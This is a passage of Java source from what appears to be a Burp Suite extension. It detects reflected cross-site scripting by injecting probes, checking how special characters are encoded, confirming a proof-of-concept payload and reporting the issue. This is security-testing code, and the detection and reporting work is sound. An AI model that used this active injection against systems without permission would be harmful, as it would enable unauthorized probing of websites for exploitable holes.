            IHttpRequestResponse rr = callbacks.makeHttpRequest(service, request);
            if (rr == null || rr.getResponse() == null) {
                return null;
            }
            byte[] respBytes = rr.getResponse();
            IResponseInfo info = helpers.analyzeResponse(respBytes);
            int off = info.getBodyOffset();
            String bodyStr = new String(Arrays.copyOfRange(respBytes, off, respBytes.length), StandardCharsets.UTF_8);

            int l = bodyStr.indexOf(lm);
            if (l < 0) {
                return null; // our value not reflected
            }
            int segStart = l + lm.length();
            int r = bodyStr.indexOf(rm, segStart);
            String segment = (r > segStart) ? bodyStr.substring(segStart, r) : bodyStr.substring(segStart,
                    Math.min(bodyStr.length(), segStart + poc.length() + 8));

            Confirmation conf = new Confirmation();
            conf.requestResponse = rr;
            conf.injectedValue = value;
            conf.confirmed = containsUnescaped(segment, poc);
            if (conf.confirmed) {
                conf.snippet = buildSnippet(bodyStr, Math.max(0, l - 24), poc.length() + lm.length() + rm.length() + 48);
            }
            return conf;
        } catch (Exception e) {
            return null;
        }
    }

    /**
     * True if {@code poc} appears in {@code segment} unencoded, and -- when the
     * payload leads with a string delimiter -- not neutralised by a backslash.
     */
    private boolean containsUnescaped(String segment, String poc) {
        if (segment == null || poc.isEmpty()) {
            return false;
        }
        boolean quoteLed = poc.charAt(0) == '"' || poc.charAt(0) == '\'' || poc.charAt(0) == '`';
        int from = 0;
        while (true) {
            int idx = segment.indexOf(poc, from);
            if (idx < 0) {
                return false;
            }
            if (!quoteLed || idx == 0 || segment.charAt(idx - 1) != '\\') {
                return true;
            }
            from = idx + 1;
        }
    }

    // ------------------------------------------------------------------
    // Dynamic, remediation-free issue construction
    // ------------------------------------------------------------------

    private IScanIssue buildDynamicIssue(String param, String insType, String source,
                                         Finding f, Confirmation conf) {
        try {
            IHttpRequestResponse evidence = conf.requestResponse;
            URL url = helpers.analyzeRequest(evidence).getUrl();

            // Markers over the live request value and the reflected payload.
            List<int[]> reqMarkers = markers(evidence.getRequest(), conf.injectedValue);
            List<int[]> respMarkers = markers(evidence.getResponse(), f.poc);
            IHttpRequestResponse marked;
            try {
                marked = callbacks.applyMarkers(evidence, reqMarkers, respMarkers);
            } catch (Exception e) {
                marked = evidence;
            }

            // Professional, Burp-consistent issue name; parameter/context in the detail.
            String name = "Cross-Site Scripting (Reflected)";
            String detail = renderDetail(f, param, insType);

            // Feed the Live Results view (confirmed by live PoC).
            try {
                IHttpService svc = evidence.getHttpService();
                String method = "";
                try {
                    method = helpers.analyzeRequest(evidence).getMethod();
                } catch (Exception ignored) {
                    // method is best-effort
                }
                XssFinding xf = new XssFinding(
                        f.severity, XssFinding.STATUS_CONFIRMED, f.contextLabel, param,
                        method, svc != null ? svc.getHost() : "", url != null ? url.toString() : "",
                        source, f.poc, evidence.getRequest(), evidence.getResponse());
                xf.reqHighlight = conf.injectedValue; // the injected probe value in the request
                xf.respHighlight = f.poc;             // the payload as reflected in the response
                if (svc != null) {
                    xf.port = svc.getPort();
                    xf.https = "https".equalsIgnoreCase(svc.getProtocol());
                }
                FindingStore.get().add(xf);
            } catch (Exception ignored) {
                // never let reporting-side wiring break issue creation
            }

            return new DynamicScanIssue(
                    evidence.getHttpService(), url, new IHttpRequestResponse[]{marked},
                    name, f.severity, "Certain", detail);
        } catch (Exception e) {
            if (settings != null && settings.getVerboseLogging()) {
                callbacks.printError("[ContextualReflectionEngine] issue build failed: " + e.getMessage());
            }
            return null;
        }
    }

    /** Only live, dynamic evidence -- no remediation or static background. */
    private String renderDetail(Finding f, String param, String insType) {
        StringBuilder d = new StringBuilder();
        d.append("<p><b>Confirmed reflected cross-site scripting</b> - detected by a live context probe and verified by injecting the proof-of-concept.</p>");
        // Parameter kept as plain text immediately after the label so Burp and the
        // de-duplicator read it correctly (distinct parameters stay distinct issues).
        d.append("<p><b>Parameter:</b> ").append(esc(param)).append(" <i>(").append(esc(insType)).append(")</i></p>");
        d.append("<p><b>Reflection context:</b> ").append(esc(f.contextLabel)).append("</p>");
        d.append("<p><b>Why it is exploitable:</b> ").append(esc(f.reason)).append("</p>");

        d.append("<h4>Break-out character test (live)</h4>");
        d.append("<p>Each character was injected at the reflection point; the response shows how the application handled it:</p>");
        d.append("<table cellpadding=\"3\" cellspacing=\"0\" border=\"1\">");
        d.append("<tr><th>Character</th><th>Result at reflection point</th></tr>");
        if (f.fate != null) {
            for (char c : SPECIALS) {
                CharFate cf = f.fate.get(c);
                if (cf == null) {
                    continue;
                }
                d.append("<tr><td><code>").append(esc(displayChar(c))).append("</code></td><td>")
                 .append(fateLabel(cf)).append("</td></tr>");
            }
        }
        d.append("</table>");

        d.append("<h4>Proof of concept (confirmed)</h4>");
        d.append("<p>Set <code>").append(esc(param)).append("</code> to:</p>");
        d.append("<pre>").append(esc(f.poc)).append("</pre>");
        d.append("<p>This payload was injected and observed reflected unencoded in the response.</p>");

        if (confSnippet(f) != null) {
            d.append("<h4>Live reflection</h4>");
            d.append("<pre>").append(confSnippet(f)).append("</pre>");
        }
        return d.toString();
    }

    private String confSnippet(Finding f) {
        return f.snippet; // already HTML-escaped
    }

    private String fateLabel(CharFate cf) {
        if (cf.present && cf.unescaped && !cf.htmlEncoded) {
            return "<span style=\"color:#b00020\"><b>Reflected UNENCODED</b></span>";
        }
        if (cf.present && cf.backslashEscaped) {
            return "Backslash-escaped (\\)";
        }
        if (cf.htmlEncoded) {
            return "HTML-entity-encoded";
        }
        if (cf.urlEncoded) {
            return "URL-encoded";
        }
        if (cf.present) {
            return "Reflected (neutralised)";
        }
        return "Stripped / blocked";
    }

    // ------------------------------------------------------------------
    // Small helpers
    // ------------------------------------------------------------------

    private Finding hi(Ctx ctx, String label, double conf, String poc, String reason) {
        return mk(ctx, label, conf, poc, reason, "High");
    }

    private Finding med(Ctx ctx, String label, double conf, String poc, String reason) {
        return mk(ctx, label, conf, poc, reason, "Medium");
    }

    private Finding mk(Ctx ctx, String label, double conf, String poc, String reason, String severity) {
        Finding f = new Finding();
        f.ctx = ctx;
        f.contextLabel = label;
        f.confidence = conf;
        f.poc = poc;
        f.reason = reason;
        f.severity = severity;
        return f;
    }

    private boolean present(Map<Character, CharFate> fate, char c) {
        CharFate f = fate.get(c);
        return f != null && f.present;
    }

    private boolean unescaped(Map<Character, CharFate> fate, char c) {
        CharFate f = fate.get(c);
        return f != null && f.present && f.unescaped && !f.htmlEncoded;
    }

    private List<int[]> markers(byte[] data, String needle) {
        List<int[]> out = new ArrayList<>();
        try {
            byte[] pat = helpers.stringToBytes(needle);
            int idx = helpers.indexOf(data, pat, true, 0, data.length);
            if (idx >= 0) {
                out.add(new int[]{idx, idx + pat.length});
            }
        } catch (Exception ignored) {
            // markers are best-effort
        }
        return out;
    }

    private String buildSnippet(String body, int start, int len) {
        int s = Math.max(0, start);
        int e = Math.min(body.length(), s + len);
        String raw = body.substring(s, e);
        return esc(raw);
    }

    private static boolean isWhite(char c) {
        return c == ' ' || c == '\t' || c == '\n' || c == '\r' || c == '\f';
    }

    private static boolean isNameStart(char c) {
        return (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z');
    }

    private static boolean isNameChar(char c) {
        return isNameStart(c) || (c >= '0' && c <= '9') || c == '-' || c == ':';
    }

    private static boolean isEventHandler(String attr) {
        return attr != null && attr.length() > 2 && attr.startsWith("on");
    }

    private static boolean isUrlAttr(String attr) {
        if (attr == null) {
            return false;
        }
        switch (attr) {
            case "href":
            case "src":
            case "action":
            case "formaction":
            case "xlink:href":
            case "poster":
            case "data":
            case "background":
            case "cite":
            case "ping":
                return true;
            default:
                return false;
        }
    }

    private static boolean regionIgnoreCase(String s, int at, String needle) {
        return s.regionMatches(true, at, needle, 0, needle.length());
    }

    private static int firstNonWhitespace(String s) {
        for (int i = 0; i < s.length(); i++) {
            if (!isWhite(s.charAt(i))) {
                return i;
            }
        }
        return 0;
    }

    /** All distinct reflection sites of the canary (skipping the interleaved
     *  copies that belong to one probe block). */
    private List<Integer> reflectionSites(String haystack, String needle) {
        List<Integer> out = new ArrayList<>();
        int from = 0;
        while (true) {
            int idx = haystack.indexOf(needle, from);
            if (idx < 0) {
                break;
            }
            out.add(idx);
            from = idx + needle.length();
            int guard = 0;
            while (guard < SPECIALS.length + 1) {
                int next = haystack.indexOf(needle, from);
                if (next < 0 || next - from > 64) {
                    break;
                }
                from = next + needle.length();
                guard++;
            }
        }
        return out;
    }

    private MimeInfo classifyMime(IResponseInfo respInfo) {
        MimeInfo m = new MimeInfo();
        String ct = "";
        try {
            for (String h : respInfo.getHeaders()) {
                String low = h.toLowerCase(Locale.ROOT);
                if (low.startsWith("content-type:")) {
                    ct = low.substring("content-type:".length()).trim();
                }
                if (low.startsWith("x-content-type-options:") && low.contains("nosniff")) {
                    m.nosniff = true;
                }
            }
        } catch (Exception ignored) {
            // headers unavailable
        }
        m.contentType = ct;
        String stated = safeLower(respInfo.getStatedMimeType());
        String inferred = safeLower(respInfo.getInferredMimeType());
        m.isJson = ct.contains("json") || stated.contains("json") || ct.contains("+json");
        m.isJavaScript = ct.contains("javascript") || ct.contains("ecmascript")
                || stated.contains("script") || ct.contains("text/js");
        boolean declaredHtml = ct.contains("text/html") || ct.contains("application/xhtml")
                || ct.isEmpty() || ct.contains("text/plain");
        m.htmlRenderable = declaredHtml || (inferred.contains("html") && !m.nosniff);
        if (m.isJson && m.nosniff) {
            m.htmlRenderable = false;
        }
        return m;
    }

    private static String safeLower(String s) {
        return s == null ? "" : s.toLowerCase(Locale.ROOT);
    }

    private static String displayChar(char c) {
        if (c == ' ') {
            return "(space)";
        }
        return String.valueOf(c);
    }

    private static String esc(String s) {
        if (s == null) {
            return "";
        }
        return s.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
                .replace("\"", "&quot;").replace("'", "&#39;");
    }

    private static String insertionTypeName(byte type) {
        switch (type) {
            case 0x00: return "URL parameter";
            case 0x01: return "Body parameter";
            case 0x02: return "Cookie";
            case 0x03: return "XML value";
            case 0x05: return "Multipart parameter";
            case 0x06: return "JSON value";
            case 0x07: return "Request header";
            case 0x20: return "URL path folder";
            case 0x25: return "URL path filename";
            default: return "Parameter";
        }
    }

    // ------------------------------------------------------------------
    // Value objects
    // ------------------------------------------------------------------

    private static final class CharFate {
        boolean present;
        boolean unescaped;
        boolean backslashEscaped;
        boolean htmlEncoded;
        boolean urlEncoded;
        boolean stripped;
    }

    private static final class MimeInfo {
        String contentType = "";
        boolean isJson;
        boolean isJavaScript;
        boolean htmlRenderable;
        boolean nosniff;

        String describe() {
            String ct = contentType == null || contentType.isEmpty() ? "no Content-Type" : contentType;
            return ct + (nosniff ? "; nosniff" : "");
        }
    }

    private static final class Finding {
        Ctx ctx;
        String contextLabel;
        double confidence;
        boolean isJson;
        String poc;
        String reason;
        String severity = "High";
        Map<Character, CharFate> fate;
        String snippet; // HTML-escaped live reflection, set after confirmation
    }

    private static final class Confirmation {
        IHttpRequestResponse requestResponse;
        String injectedValue;
        boolean confirmed;
        String snippet;
    }

    /**
     * Self-contained issue carrying only dynamic, real-time evidence. Background
     * and remediation are intentionally empty.
     */
    private static final class DynamicScanIssue implements IScanIssue {
        private final IHttpService service;
        private final URL url;
        private final IHttpRequestResponse[] messages;
        private final String name;
        private final String severity;
        private final String confidence;
        private final String detail;

        DynamicScanIssue(IHttpService service, URL url, IHttpRequestResponse[] messages,
                         String name, String severity, String confidence, String detail) {
            this.service = service;
            this.url = url;
            this.messages = messages;
            this.name = name;
            this.severity = severity;
            this.confidence = confidence;
            this.detail = detail;
        }

        @Override public URL getUrl() { return url; }
        @Override public String getIssueName() { return name; }
        @Override public int getIssueType() { return 0x00200100; } // Reflected XSS
        @Override public String getSeverity() { return severity; }
        @Override public String getConfidence() { return confidence; }
        @Override public String getIssueBackground() { return ""; }
        @Override public String getRemediationBackground() { return ""; }
        @Override public String getIssueDetail() { return detail; }
        @Override public String getRemediationDetail() { return ""; }
        @Override public IHttpRequestResponse[] getHttpMessages() { return messages; }
        @Override public IHttpService getHttpService() { return service; }
    }
}
